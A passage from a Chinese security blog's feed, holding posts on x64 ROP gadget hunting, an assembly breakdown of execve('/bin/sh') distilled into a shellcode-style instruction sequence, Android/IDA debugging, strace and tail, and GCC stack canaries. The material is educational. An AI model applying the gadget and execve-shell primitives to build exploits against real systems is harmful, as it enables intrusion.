    <summary type="html">
    
      &lt;h3 id=&quot;寻找Gadgets&quot;&gt;&lt;a href=&quot;#寻找Gadgets&quot; class=&quot;headerlink&quot; title=&quot;寻找Gadgets&quot;&gt;&lt;/a&gt;寻找Gadgets&lt;/h3&gt;&lt;p&gt;x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。比如objdump -d black_hole(文件名)后我们找到了类似于pop rdi；ret的gadget。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://spd.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="CTF" scheme="http://spd.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>从汇编角度分析execve函数</title>
    <link href="http://spd.dropsec.xyz/2017/02/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90execve%E5%87%BD%E6%95%B0/"/>
    <id>http://spd.dropsec.xyz/2017/02/20/从汇编角度分析execve函数/</id>
    <published>2017-02-20T08:30:50.000Z</published>
    <updated>2017-04-07T09:09:12.504Z</updated>
    
    <content type="html"><![CDATA[<h3 id="用C语言写一个execve调用的demo"><a href="#用C语言写一个execve调用的demo" class="headerlink" title="用C语言写一个execve调用的demo"></a>用C语言写一个execve调用的demo</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include</div><div class="line">void main()&#123;</div><div class="line">char *name[2];</div><div class="line">name[0]=&quot;bin/sh&quot;</div><div class="line">name[1]=NULL;</div><div class="line">execve(name[0],name,NULL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>execve函数将执行一个程序。他需要程序的名字地址作为第一个参数。一个内容为该程序的argv<a href="argv[n-1]=0">i</a>的指针数组作为第二个参数，以及(char*) 0作为第三个参数.</p>
<h3 id="execve的汇编代码"><a href="#execve的汇编代码" class="headerlink" title="execve的汇编代码"></a>execve的汇编代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble __execve </div><div class="line">　　Dump of assembler code for function __execve: </div><div class="line">　　0x80002bc &lt;__execve&gt;: pushl %ebp ; </div><div class="line">　　0x80002bd &lt;__execve+1&gt;: movl %esp,%ebp </div><div class="line">　　;上面是函数头。 </div><div class="line">　　0x80002bf &lt;__execve+3&gt;: pushl %ebx </div><div class="line">　　;保存ebx </div><div class="line">　　0x80002c0 &lt;__execve+4&gt;: movl $0xb,%eax </div><div class="line">　　;eax=0xb，eax指明第几号系统调用。 </div><div class="line">　　0x80002c5 &lt;__execve+9&gt;: movl 0x8(%ebp),%ebx </div><div class="line">　　;ebp+8是第一个参数&quot;/bin/sh\0&quot; </div><div class="line">　　0x80002c8 &lt;__execve+12&gt;: movl 0xc(%ebp),%ecx </div><div class="line">　　;ebp+12是第二个参数name数组的地址 </div><div class="line">　　0x80002cb &lt;__execve+15&gt;: movl 0x10(%ebp),%edx </div><div class="line">　　;ebp+16是第三个参数空指针的地址。 </div><div class="line">　　;name[2-1]内容为NULL，用来存放返回值。 </div><div class="line">　　0x80002ce &lt;__execve+18&gt;: int $0x80 </div><div class="line">　　;执行0xb号系统调用(execve) </div><div class="line">　　0x80002d0 &lt;__execve+20&gt;: movl %eax,%edx </div><div class="line">　　;下面是返回值的处理就没有用了。 </div><div class="line">　　0x80002d2 &lt;__execve+22&gt;: testl %edx,%edx </div><div class="line">　　0x80002d4 &lt;__execve+24&gt;: jnl 0x80002e6 &lt;__execve+42&gt; </div><div class="line">　　0x80002d6 &lt;__execve+26&gt;: negl %edx </div><div class="line">　　0x80002d8 &lt;__execve+28&gt;: pushl %edx </div><div class="line">　　0x80002d9 &lt;__execve+29&gt;: call 0x8001a34 </div><div class="line">　　&lt;__normal_errno_location&gt; </div><div class="line">　　0x80002de &lt;__execve+34&gt;: popl %edx </div><div class="line">　　0x80002df &lt;__execve+35&gt;: movl %edx,(%eax) </div><div class="line">　　0x80002e1 &lt;__execve+37&gt;: movl $0xffffffff,%eax </div><div class="line">　　0x80002e6 &lt;__execve+42&gt;: popl %ebx </div><div class="line">　　0x80002e7 &lt;__execve+43&gt;: movl %ebp,%esp </div><div class="line">　　0x80002e9 &lt;__execve+45&gt;: popl %ebp </div><div class="line">　　0x80002ea &lt;__execve+46&gt;: ret </div><div class="line">　　0x80002eb &lt;__execve+47&gt;: nop </div><div class="line">　　End of assembler dump.</div></pre></td></tr></table></figure>
<h3 id="经过以上分析，可以得到如下的精简指令算法"><a href="#经过以上分析，可以得到如下的精简指令算法" class="headerlink" title="经过以上分析，可以得到如下的精简指令算法"></a>经过以上分析，可以得到如下的精简指令算法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">movl $execve的系统调用号,%eax </div><div class="line">　　movl &quot;bin/sh\0&quot;的地址,%ebx </div><div class="line">　　movl name数组的地址,%ecx </div><div class="line">　　movl name[n-1]的地址,%edx </div><div class="line">　　int $0x80 ;执行系统调用(execve)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;用C语言写一个execve调用的demo&quot;&gt;&lt;a href=&quot;#用C语言写一个execve调用的demo&quot; class=&quot;headerlink&quot; title=&quot;用C语言写一个execve调用的demo&quot;&gt;&lt;/a&gt;用C语言写一个execve调用的demo&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;#include&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void main()&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;char *name[2];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;name[0]=&amp;quot;bin/sh&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;name[1]=NULL;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;execve(name[0],name,NULL);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="逆向破解" scheme="http://spd.dropsec.xyz/categories/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="Windows" scheme="http://spd.dropsec.xyz/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>使用IDA Pro动态调试原生so</title>
    <link href="http://spd.dropsec.xyz/2016/12/31/%E4%BD%BF%E7%94%A8IDA-Pro%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%8E%9F%E7%94%9Fso/"/>
    <id>http://spd.dropsec.xyz/2016/12/31/使用IDA-Pro动态调试原生so/</id>
    <published>2016-12-31T13:18:43.000Z</published>
    <updated>2017-04-07T09:27:29.016Z</updated>
    
    <content type="html"><![CDATA[<p>如果是第一次调试首先要修改一下配置文件。修改IDA6.8的cfg/exception.cfg，修改.linux为.linux,.armlinux<br><a id="more"></a><br><img src="http://oeiu48wqi.bkt.clouddn.com/201612310.png" alt=""></p>
<p>用命令android list avd 查看所有的模拟器</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612311.png" alt=""></p>
<p>Emulator –avd android1启动模拟器</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612312.png" alt=""></p>
<p>模拟器启动后，在IDA的安装路径中找到android_server文件</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612313.png" alt=""></p>
<ul>
<li>将android_server拷贝到模拟器的/data/local/tmp目录下面。</li>
<li>Adb push android_server /data/local/tmp</li>
<li>接着输入adb shell chmod 777 /data/local/tmp/android_server” 给android_server加上相应的权限。</li>
<li>接着输入 adb shell /data/local/tmp/android_server”启动android_server。</li>
</ul>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612314.png" alt=""></p>
<p>重新打开一个命令提示符，<br>输入”adb forward tcp:23946 tcp:23946”进行tcp端口转发</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612315.png" alt=""></p>
<ul>
<li>使用adb install 111.apk将111.apk安装到模拟器上。先输入”adb shell”,然后输入”su root”获取root权限后</li>
<li>adb root 模式下执行am start –D –n com.alibaba.wireless.security.hellojnigradle/com.alibaba.wireless.security.hellojnigradle.MainActivity<br>命令，启动所要调试的Activity。</li>
</ul>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612316.png" alt=""></p>
<p>app会弹出”Waitting for debugger”对话框,如下图所示:</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612317.png" alt=""></p>
<p>启动ida pro，点击”Debugger - &gt; Attach -&gt; Remote ArmLinux/Android debugger”，会看到以下对话框:</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612318.png" alt=""></p>
<p>点击”Debug options”按钮，在”Suspend on process entry point”, ”Suspend on thread start/exit”, ”Suspend on library load/unload” 等选项的前面打上勾,如下图所示：</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612319.png" alt=""></p>
<p>点击”ok”后会在以下对话框的hostname中填上”localhost”</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/2016123110.png" alt=""></p>
<p>在弹出的”Choose process to attach to”窗口中找到” “com.alibaba.wireless.security.hellojnigradle”进程，选中该进程，然后点击”ok”按钮。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/2016123111.png" alt=""></p>
<p>使用DDMS命令打开DDMS，查看jdb对应的调试端口.</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/2016123112.png" alt=""><br><img src="http://oeiu48wqi.bkt.clouddn.com/2016123113.png" alt=""></p>
<p>打开命令提示符，输入以下命令：jdb -connect com.sun.jdi.SocketAttach:port=8700,hostname=localhost。这里的jdb要进到JDK安装目录下才能起作用。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/2016123114.png" alt=""></p>
<p>回到IDA，<br>然后就是F9运行，F2设置断点，F8单步了。</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/2016123115.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如果是第一次调试首先要修改一下配置文件。修改IDA6.8的cfg/exception.cfg，修改.linux为.linux,.armlinux&lt;br&gt;
    
    </summary>
    
      <category term="Android" scheme="http://spd.dropsec.xyz/categories/Android/"/>
    
    
      <category term="Android逆向" scheme="http://spd.dropsec.xyz/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>使用Android studio调试Smail代码</title>
    <link href="http://spd.dropsec.xyz/2016/12/30/%E4%BD%BF%E7%94%A8Android-studio%E8%B0%83%E8%AF%95Smail%E4%BB%A3%E7%A0%81/"/>
    <id>http://spd.dropsec.xyz/2016/12/30/使用Android-studio调试Smail代码/</id>
    <published>2016-12-30T13:05:52.000Z</published>
    <updated>2017-04-07T09:25:37.512Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>为了调试smail也是蛮拼的，看各种帖子做各种尝试，最有良心的要算拾荒人的这篇帖子了，链接在此<a href="http://www.w2bc.com/article/148467" target="_blank" rel="external">http://www.w2bc.com/article/148467</a></p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><ol>
<li>在调试中遇到的最大的问题要数Debugger提示的端口被占用或者无法链接的问题了，这篇帖子中做了详细的说明。</li>
<li>在调试之前要打开安卓模拟器，虽然AS自带的安卓模拟器在导入smail文件后无法通过正常的按钮打开，但是一定要想办法打开，比如通过其他工程打开。</li>
<li>我的Android Studio的版本是2.2.3，需要改进的是帖子中3.2在AS的终端以调试模式启动应用的命令。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell am start -n &quot;com.hello/com.hello.MainActivity&quot; -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -D</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h3&gt;&lt;p&gt;为了调试smail也是蛮拼的，看各种帖子做各种尝试，最有良心的要算拾荒人的这篇帖子了，链接在此&lt;a href=&quot;http:/
    
    </summary>
    
      <category term="Android" scheme="http://spd.dropsec.xyz/categories/Android/"/>
    
    
      <category term="Android逆向" scheme="http://spd.dropsec.xyz/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Ltrace加Tail实现ELF可执行内容监视</title>
    <link href="http://spd.dropsec.xyz/2016/12/16/Ltrace%E5%8A%A0Tail%E5%AE%9E%E7%8E%B0ELF%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%86%85%E5%AE%B9%E7%9B%91%E8%A7%86/"/>
    <id>http://spd.dropsec.xyz/2016/12/16/Ltrace加Tail实现ELF可执行内容监视/</id>
    <published>2016-12-15T16:35:23.000Z</published>
    <updated>2017-04-07T09:04:59.384Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-题记"><a href="#0x01-题记" class="headerlink" title="0x01 题记"></a>0x01 题记</h3><p>调试ELF文件时发现一个很不错的搭配功能，strace 命令是一种强大的工具，它能够显示所有由用户空间程序发出的系统调用，而使用tail命令的-f选项可以方便的查阅正在改变的日志文件。那么结合起来就可以查看程序系统调用的变化。<br><a id="more"></a></p>
<h3 id="0x01-strace-使用说明"><a href="#0x01-strace-使用说明" class="headerlink" title="0x01 strace 使用说明"></a>0x01 strace 使用说明</h3><ol>
<li>用途</li>
</ol>
<p>跟踪程式执行时的系统调用和所接收的信号.通常的用法是strace执行一直到commande结束.<br>并且将所调用的系统调用的名称、参数和返回值输出到标准输出或者输出到-o指定的文件.<br>strace是一个功能强大的调试,分析诊断工具.你将发现他是一个极好的帮手在你要调试一个无法看到源码或者源码无法在编译的程序.你将轻松的学习到一个软件是如何通过系统调用来实现他的功能的.而且作为一个程序设计师,你可以了解到在用户态和内核态是如何通过系统调用和信号来实现程序的功能的.</p>
<ol>
<li>参数说明:</li>
</ol>
<p>-c 统计每一系统调用的所执行的时间,次数和出错的次数等.<br>-d 输出strace关于标准错误的调试信息.<br>-f 跟踪由fork调用所产生的子进程.<br>-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号.<br>-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪.<br>-h 输出简要的帮助信息.<br>-i 输出系统调用的入口指针.<br>-q 禁止输出关于脱离的消息.<br>-r 打印出相对时间关于,,每一个系统调用.<br>-t 在输出中的每一行前加上时间信息.<br>-tt 在输出中的每一行前加上时间信息,微秒级.<br>-ttt 微秒级输出,以秒了表示时间.<br>-T 显示每一调用所耗的时间.<br>-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出.<br>-V 输出strace的版本信息.<br>-x 以十六进制形式输出非标准字符串<br>-xx 所有字符串以十六进制形式输出.<br>-a column<br>设置返回值的输出位置.默认为40.<br>-e expr<br>指定一个表达式,用来控制如何跟踪.格式如下:<br>[qualifier=][!]value1[,value2]…<br>qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的qualifier是 trace.感叹号是否定符号.例如:<br>-eopen等价于 -e trace=open,表示只跟踪open调用.而-etrace!=open表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none.<br>注意有些shell使用!来执行历史记录里的命令,所以要使用\.<br>-e trace=set<br>只跟踪指定的系统调用.例如:-e trace=open,close,rean,write表示只跟踪这四个系统调用.默认的为set=all.<br>-e trace=file<br>只跟踪有关文件操作的系统调用.<br>-e trace=process<br>只跟踪有关进程控制的系统调用.<br>-e trace=network<br>跟踪与网络有关的所有系统调用.<br>-e strace=signal<br>跟踪所有与系统信号有关的系统调用<br>-e trace=ipc<br>跟踪所有与进程通讯有关的系统调用<br>-e abbrev=set<br>设定strace输出的系统调用的结果集.-v 等与 abbrev=none.默认为abbrev=all.<br>-e raw=set<br>将指定的系统调用的参数以十六进制显示.<br>-e signal=set<br>指定跟踪的系统信号.默认为all.如signal=!SIGIO(或者signal=!io),表示不跟踪SIGIO信号.<br>-e read=set<br>输出从指定文件中读出的数据.例如:<br>-e read=3,5<br>-e write=set<br>输出写入到指定文件中的数据.<br>-o filename<br>将strace的输出写入文件filename<br>-p pid<br>跟踪指定的进程pid.<br>-s strsize<br>指定输出的字符串的最大长度.默认为32.文件名一直全部输出.<br>-u username<br>以username的UID和GID执行被跟踪的命令.</p>
<h3 id="0x02-tail-使用说明"><a href="#0x02-tail-使用说明" class="headerlink" title="0x02 tail 使用说明"></a>0x02 tail 使用说明</h3><ol>
<li>用途</li>
</ol>
<p>从指定点开始将文件写到标准输出。使用tail命令的-f选项可以方便的查阅正在改变的日志文件，tail -f filename会把filename里最尾部的内容显示在屏幕上，并且不但刷新，使你看到最新的文件内容。</p>
<ol>
<li>参数说明</li>
</ol>
<p>-b Number 从 Number 变量表示的 512 字节块位置开始读取指定文件。<br>-c Number 从 Number 变量表示的字节位置开始读取指定文件。<br>-f 如果输入文件是常规文件或如果 File 参数指定 FIFO（先进先出），那么 tail 命令不会在复制了输入文件的最后的指定单元后终止，而是继续从输入文件读取和复制额外的单元（当这些单元可用时）。如果没有指定 File 参数，并且标准输入是管道，则会忽略 -f 标志。tail -f 命令可用于监视另一个进程正在写入的文件的增长。<br>-k Number 从 Number 变量表示的1KB 块位置开始读取指定文件。<br>-m Number 从 Number 变量表示的多字节字符位置开始读取指定文件。使用该标志提供在单字节和双字节字符代码集环境中的一致结果。<br>-n Number 从首行或末行位置来读取指定文件，位置由 Number 变量的符号（+ 或 - 或无）表示，并通过行号 Number 进行位移。<br>-r 从文件末尾以逆序方式显示输出。-r 标志的缺省值是以逆序方式显示整个文件。   </p>
<p>如果文件大于 20,480 字节，那么-r标志只显示最后的 20,480 字节。 -r 标志只有   与 -n 标志一起时才有效。否则，就会将其忽略。</p>
<h3 id="0x03-搭配结果举例"><a href="#0x03-搭配结果举例" class="headerlink" title="0x03 搭配结果举例"></a>0x03 搭配结果举例</h3><p>ltrace的-f跟踪由fork调用所产生的子进程，-s指定输出的字符串的最大长度为256，然后重定向到/tmp/out文件，最后就可以用tail -f查看out文件得知elf文件的子进程变化了。<br>上图：</p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612151.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-题记&quot;&gt;&lt;a href=&quot;#0x01-题记&quot; class=&quot;headerlink&quot; title=&quot;0x01 题记&quot;&gt;&lt;/a&gt;0x01 题记&lt;/h3&gt;&lt;p&gt;调试ELF文件时发现一个很不错的搭配功能，strace 命令是一种强大的工具，它能够显示所有由用户空间程序发出的系统调用，而使用tail命令的-f选项可以方便的查阅正在改变的日志文件。那么结合起来就可以查看程序系统调用的变化。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://spd.dropsec.xyz/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Linux" scheme="http://spd.dropsec.xyz/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Stack-smashing Protection(SSP)栈保护机制</title>
    <link href="http://spd.dropsec.xyz/2016/12/15/Stack-smashing%C2%A0Protection(SSP)%E6%A0%88%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>http://spd.dropsec.xyz/2016/12/15/Stack-smashing Protection(SSP)栈保护机制/</id>
    <published>2016-12-15T13:54:54.000Z</published>
    <updated>2017-04-07T09:08:36.064Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-题记"><a href="#0x01-题记" class="headerlink" title="0x01 题记"></a>0x01 题记</h3><p>做pwn题32C3时遇到Stack-smashing Protection(SSP)栈保护机制，不懂的其利用原理，特查阅资料学习一下。<br><a id="more"></a></p>
<h3 id="0x02-技术浅析"><a href="#0x02-技术浅析" class="headerlink" title="0x02 技术浅析"></a>0x02 技术浅析</h3><p>Stack-smashing Protection(SSP)栈保护机制是由GCC的”-fstack-protector” 选项提供提供的，GCC的SSP机制实现了两种类型的栈保护，其一：变量在栈中的顺序发生了改变；其二：启用了canary值检测栈EIP是否被修改。栈中局部变量的组织方式重排列即编译器将所有的局部数组变量放置在栈的高地址位，尽可能地将所有buffers放置在接近canary的位置上，且尽可能地远离各个变量指针，此时利用数组溢出方式无法覆盖其它关键变量如局部函数指针等，实例分析如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> int func(char *arg1, char *arg2) &#123;        </div><div class="line">int a; </div><div class="line">       char b[10];        </div><div class="line">char c[2]; </div><div class="line">       strcpy(b, arg1);        </div><div class="line">strcpy (c, arg2);        </div><div class="line">a = 1;       </div><div class="line">       return 0;&#125;</div></pre></td></tr></table></figure></p>
<p>启用SSP前后，上述代码的栈结构布局分别如图1, 2 所示。 不启用SSP保护机制，编译上述程序gcc –E exp.c –o exp.i，gcc –S exp.i，生成的汇编编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">func:  </div><div class="line"> pushl  %ebp  </div><div class="line"> movl   %esp, %ebp  </div><div class="line"> subl   $24, %esp </div><div class="line"> movl   8(%ebp), %eax    ;将参数argv1拷贝到%eax处  </div><div class="line"> movl   %eax, 4(%esp)    ;再将%eax存放的argv1拷贝到%esp+4  </div><div class="line"> leal   -14(%ebp), %eax   ;将buff b[]地址拷贝到%eax  </div><div class="line"> movl   %eax, (%esp)     ;将%eax存放的b[]拷贝到%esp</div><div class="line"> call   strcpy           ;调用strcpy函数拷贝(%esp，%esp+4),即(b[],argv1)  </div><div class="line"> movl   12(%ebp), %eax   ;将参数argv2拷贝到%eax处  </div><div class="line"> movl   %eax, 4(%esp)    ;再将%eax存放的argv2拷贝到%esp+4  </div><div class="line"> leal   -16(%ebp), %eax  ;将buff c[]地址拷贝到%eax  </div><div class="line"> movl   %eax, (%esp)     ;将%eax存放的c[]拷贝到%esp </div><div class="line"> call   strcpy           ;调用strcpy函数拷贝(%esp，%esp+4),即(c[],argv2)  </div><div class="line"> movl   $1, -4(%ebp)     ;将值1拷贝到%ebp-4处，注意：%ebp-4存放的地址即&amp;a;  </div><div class="line"> movl   $0, %eax  </div><div class="line"> leave  ret</div></pre></td></tr></table></figure></p>
<p>启用SSP保护机制，编译上述程序“gcc –E exp.c –o exp.i –fstack-protector”，“gcc –S exp.i –fstack-protector”，生成的汇编编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">func:  </div><div class="line"> pushl  %ebp  </div><div class="line"> movl   %esp, %ebp  </div><div class="line"> subl   $56, %esp  </div><div class="line"> movl   8(%ebp), %eax  </div><div class="line"> movl   %eax, -36(%ebp)  </div><div class="line"> movl   12(%ebp), %eax  </div><div class="line"> movl   %eax, -40(%ebp)  </div><div class="line"> movl   %gs:20, %eax       ;取出canary  </div><div class="line"> movl   %eax, -4(%ebp)     ;将canary放置在ebp-4处  </div><div class="line"> xorl   %eax, %eax           </div><div class="line"> movl   -36(%ebp), %eax    ;将参数argv1拷贝到%eax处  </div><div class="line"> movl   %eax, 4(%esp)      ;再将%eax存放的argv1拷贝到%esp+4  </div><div class="line"> leal   -14(%ebp), %eax    ;将buff b[]地址拷贝到%eax  </div><div class="line"> movl   %eax, (%esp)       ;将%eax存放的b[]拷贝到%esp  </div><div class="line"> call   strcpy             ;调用strcpy函数拷贝(%esp，%esp+4),即(b[],argv1)  </div><div class="line"> movl   -40(%ebp), %eax    ;将参数argv2拷贝到%eax处</div><div class="line"> movl   %eax, 4(%esp)      ;再将%eax存放的argv2拷贝到%esp+4  </div><div class="line"> leal   -16(%ebp), %eax    ;将buff c[ ]地址拷贝到%eax  </div><div class="line"> movl   %eax, (%esp)       ;将%eax存放的c[ ]拷贝到%esp </div><div class="line"> call   strcpy             ;调用strcpy函数拷贝(%esp，%esp+4),即(c[],argv2)  </div><div class="line"> movl   $1, -20(%ebp)      ;将值1拷贝到%ebp-20处，注意：%ebp-20存放的地址即&amp;a;  </div><div class="line"> movl   $0, %eax  </div><div class="line"> movl   -4(%ebp), %edx     ;取%ebp-4位置处地址，将其拷贝给%edx,即canary值  </div><div class="line"> xorl   %gs:20, %edx       ;比较%gs:20与栈内保存的canary是否相等；  </div><div class="line"> je .L3 </div><div class="line"> call __stack_chk_fail</div></pre></td></tr></table></figure></p>
<p><img src="http://oeiu48wqi.bkt.clouddn.com/201612150.png" alt=""></p>
<p>事实上，编译器将所有局部函数指针都搬迁到了栈中已分配空间的低地址位，如程序exp.c在启用-fstack-protector编译后的汇编代码，编译器优化了栈结构布局，将b[10]、a[2]两个数组紧邻canary存放，而把变量a防止在栈顶位置。这种类型的防御措施非常关键，可有效降低攻击者使用各种shellcode 地址覆盖栈内局部函数指针从而实施攻击的可能性。GCC SSP栈保护机制中同样也使用了随机数“canary”探针，在局部变量与函数返回地址EIP之间插入一个canary探针，如图2所示。在函数的末尾代码中，内核校验栈内的canary值是否发生改变，若两个值不一致，则内核终止函数执行，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">prologue:  </div><div class="line">       movl   %gs:20, %eax       ;取出canary       </div><div class="line">       movl   %eax, -4(%ebp)     ;将canary放置在ebp-4处 </div><div class="line">. . . </div><div class="line">epilogue :  </div><div class="line">      movl    -4(%ebp), %edx     ;取%ebp-4位置处地址，将其拷贝给%edx,即canary值 </div><div class="line">      xorl    %gs:20, %edx       ;比较%gs:20与栈内保存的canary是否相等； </div><div class="line">      je .L3 </div><div class="line">      call __stack_chk_fail</div></pre></td></tr></table></figure></p>
<p>首先读取存放在%gs:0x20位置处的探针值，并插入到栈的指定位置，然后在函数指令末尾片段处重新读取事先插入的canary值，并将其与%gs:0x20位置处canary进行比较，若校验失败，GCC会调用__stack_chk_fail函数，输出错误消息中止运行。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-题记&quot;&gt;&lt;a href=&quot;#0x01-题记&quot; class=&quot;headerlink&quot; title=&quot;0x01 题记&quot;&gt;&lt;/a&gt;0x01 题记&lt;/h3&gt;&lt;p&gt;做pwn题32C3时遇到Stack-smashing Protection(SSP)栈保护机制，不懂的其利用原理，特查阅资料学习一下。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://spd.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Stack-smashing-Protection" scheme="http://spd.dropsec.xyz/tags/Stack-smashing-Protection/"/>
    
  </entry>
  
  <entry>
    <title>2016问鼎杯-6-2</title>
